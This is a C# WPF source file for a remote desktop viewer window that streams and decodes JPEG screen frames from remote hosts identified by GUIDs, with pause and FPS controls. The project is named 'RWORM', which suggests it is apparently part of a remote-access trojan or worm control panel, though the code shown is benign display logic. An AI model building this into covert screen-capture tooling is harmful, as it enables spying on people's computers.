using System;
using System.IO;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media.Imaging;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class RemoteDesktopWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string           _guid;
        private bool _paused;
        private bool _closed;                 // set in OnClosed — drop late frames
        private int  _frameCount;
        private int  _frameBusy;              // 1 while a frame is being decoded
        private DateTime _lastFpsCalc = DateTime.Now;

        public RemoteDesktopWindow(ServerConnection server, string guid, string hostname)
        {
            InitializeComponent();
            _server = server;
            _guid   = guid;
            Title   = $"Remote Desktop — {hostname}";
            TitleLabel.Text = hostname;
            FpsLabel.Text   = "5";

            _server.RegisterRDHandler(guid, OnFrame);
            _ = _server.StartRemoteDesktop(guid);
            StatusLabel.Text = "Connecting...";
        }

        private void OnFrame(byte[] jpeg)
        {
            // Frames arrive on the connection's receive thread at up to 20 fps.
            // Drop the frame instead of queueing when the window is closing or
            // the previous frame is still decoding — a backlog here blocks the
            // receive loop (Dispatcher.Invoke) and used to freeze/crash the app.
            if (_closed || _paused) return;
            if (Interlocked.CompareExchange(ref _frameBusy, 1, 0) != 0) return;

            _frameCount++;

            // Update FPS label every second
            var now = DateTime.Now;
            if ((now - _lastFpsCalc).TotalSeconds >= 1)
            {
                var fps = _frameCount;
                _frameCount  = 0;
                _lastFpsCalc = now;
                Dispatcher.BeginInvoke(new Action(() =>
                {
                    if (!_closed) FpsActual.Text = $"{fps} fps";
                }));
            }

            Dispatcher.BeginInvoke(new Action(() =>
            {
                try
                {
                    if (_closed) return;
                    using var ms = new MemoryStream(jpeg);
                    var bmp = new BitmapImage();
                    bmp.BeginInit();
                    bmp.StreamSource   = ms;
                    bmp.CacheOption    = BitmapCacheOption.OnLoad;
                    bmp.CreateOptions  = BitmapCreateOptions.None;
                    bmp.EndInit();
                    bmp.Freeze();
                    ScreenView.Source  = bmp;
                    StatusLabel.Text   = $"Live — {bmp.PixelWidth}×{bmp.PixelHeight}";
                    StatusDot.Fill     = new System.Windows.Media.SolidColorBrush(
                        System.Windows.Media.Color.FromRgb(0x3F, 0xB9, 0x50));
                }
                catch { }   // corrupt/partial frame — skip it
                finally { Interlocked.Exchange(ref _frameBusy, 0); }
            }));
        }

        private void Pause_Click(object s, RoutedEventArgs e)
        {
            _paused = !_paused;
            PauseBtn.Content = _paused ? "▶ Resume" : "⏸ Pause";
            StatusLabel.Text  = _paused ? "Paused" : "Live";
        }

        private void FpsSlider_Changed(object s, RoutedPropertyChangedEventArgs<double> e)
            => FpsLabel.Text = ((int)FpsSlider.Value).ToString();

        protected override void OnClosed(EventArgs e)
        {
            _closed = true;
            _server.UnregisterRDHandler(_guid);
            _ = _server.StopRemoteDesktop(_guid);
            base.OnClosed(e);
        }
    }
}
